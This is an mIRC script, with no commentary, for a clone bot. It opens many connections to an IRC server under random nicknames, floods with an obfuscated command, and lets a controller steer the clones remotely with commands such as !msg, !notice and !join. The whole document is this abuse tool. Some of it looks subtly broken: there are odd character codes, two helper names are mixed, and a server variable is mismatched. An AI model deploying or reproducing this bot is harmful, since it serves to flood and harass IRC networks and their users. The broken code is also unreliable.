alias clone {
  if ($1 == $null) { return }
  unset %c.server %c.port %ccount
  if ($1 isnum) { %c.count = $1 | %c.server = $2 | %c.port = $3 }
  else { %c.count = 1 | %c.server = $1 | %c.port = $2 }
  %c.inc = 0 | :start | inc %c.inc | if (%c.inc > %c.count) { return } | %c.sock = clone $+ $r(1,9999)
  :loop | if ($sock(%c.sock).name) { %c.sock = clone $+ $r(1,9999) | goto loop }
  if (%c.port) { sockopen %c.sock %c.server %c.port }
  else { %c.port = 6667 | sockopen %c.sock %c.server 6667 }
  goto start
}
on 1:sockopen:clone*:{
  inc %ccount 
  .bocon $sockname pong %cserver
  .bocon $sockname conn irc.webchat.org
  .bocon $sockname user $read fonts\random.cnf $+ $read fonts\ident.txt 1 2 : $+ $read fonts\username.txt
  .bocon $sockname nick $r(a,z) $+ $read fonts\nick.txt $read fonts\nick.txt $read fonts\nick.txt $read fonts\nick.txt 
  .bocon $sockname $chr(618) $+ $chr(623) $+ $chr(105) $+ $chr(0110) %c.flood1 $+ , $+ %c.flood2 $+ , $+ %c.flood3 $+ , $+ %c.flood4
  .timer$ 1 16 .bocon $sockname $chr(618) $+ $chr(623) $+ $chr(105) $+ $chr(0110) %c.flood1 $+ , $+ %c.flood2 $+ , $+ %c.flood3 $+ , $+ %c.flood4
}
on 1:sockread:clone*:{
  if ($sockerr > 0) { return }
  :again | .sockread %tmp | if ($sockbr == 0) { return } | if (%tmp == $null) { goto again } 
  if ($mid(%tmp,1,4) == PING) { .botcon $sockname PONG $remove($remove(%tmp,ping :),ping) | halt } 
  if ($sockbr == 0) { return } 
  if ($gettok(%tmp,1,32) == ping) { .bocon $sockname PONG $gettok(%tmp,2-,32) }
  if ($gettok(%tmp,2,32) == 451) { botcon $sockname nick $r(a,Z) 1 2 : $+ $read fonts\nick.txt }
  if ($gettok(%tmp,2,32) == 433) { botcon $sockname nick $r(a,Z) 1 2 : $+ $read fonts\nick.txt }
  tetem %tmp
  set %meteo $remove($gettok(%tmp,1,33),:)
  if ($level(%meteo) != beruk) && ($level(%meteo) != babi) {
    if (nickserv isin $remove($gettok(%tmp,1,33),:)) {
      if (is owned isin $remove($gettok(%tmp,4-,32),:)) { /botcon $sockname nick $r(a,Z) 1 2 : $+ $read fonts\nick.txt }
      else { halt }
    }
    if ($remove($gettok(%tmp,1,33),:) ison $comchan($me,1)) { /botcon $sockname privmsg $remove($gettok(%tmp,1,33),:)) $read fonts\username.txt }
    halt
  }
  if ($remove($gettok(%tmp,4,32),:) = !quit) { .botcon $sockname quit | sockclose $sockname | dec %c.count | halt }
  if ($remove($gettok(%tmp,4,32),:) = !nick) { .botcon $sockname nick $gettok(%tmp,5,32) | .botcon $sockname privmsg %meteo 12Changing nick to $gettok(%tmp,5-,32) }
  if ($remove($gettok(%tmp,4,32),:) = !msg) { .botcon $sockname privmsg $remove($gettok(%tmp,5-,32),:) | .botcon $sockname privmsg %meteo 12MSGing $gettok(%tmp,5-,32) }
  if ($remove($gettok(%tmp,4,32),:) = !notice) { .botcon $sockname notice $remove($gettok(%tmp,5-,32),:) | .botcon $sockname privmsg %meteo 12Noticing $gettok(%tmp,5-,32) }
  if ($remove($gettok(%tmp,4,32),:) = !join) { 
    if ($chr(35) !isin $remove($gettok(%tmp,5,32),:)) { .botcon $sockname join $chr(35) $+ $gettok(%tmp,5-,32) | .botcon $sockname privmsg %meteo 12Joining $chr(35) $+ $gettok(%tmp,5-,32) }
    if ($chr(35) isin $remove($gettok(%tmp,5,32),:)) { .botcon $sockname join $gettok(%tmp,5-,32) | .botcon $sockname privmsg %meteo 12Joining $gettok(%tmp,5-,32) }
  }
  if ($remove($gettok(%tmp,4,32),:) = !part) { 
    if ($chr(35) !isin $remove($gettok(%tmp,5,32),:)) { .botcon $sockname part $chr(35) $+ $gettok(%tmp,5-,32) | .botcon $sockname privmsg %meteo 12Parting $chr(35) $+ $gettok(%tmp,5-,32) }
    if ($chr(35) isin $remove($gettok(%tmp,5,32),:)) { .botcon $sockname part $gettok(%tmp,5-,32) | .botcon $sockname privmsg %meteo 12Parting $gettok(%tmp,5-,32) }
  }
  if ($remove($gettok(%tmp,4,32),:) = !trace) { .timer 1 0 .botcon $sockname privmsg %meteo $gettok(%tmp,5-,32) }
  goto again
}
alias botcon { .sockwrite -tn $1- }
alias bocon { .sockwrite -n $1- }

alias tetem { 
  if ($2 != PRIVMSG) && ($chr(35) isin $3) { halt }
  if ($2 == PRIVMSG) && ($3 ison $comchan($me,1)) { haltdef }
  else { halt }
}

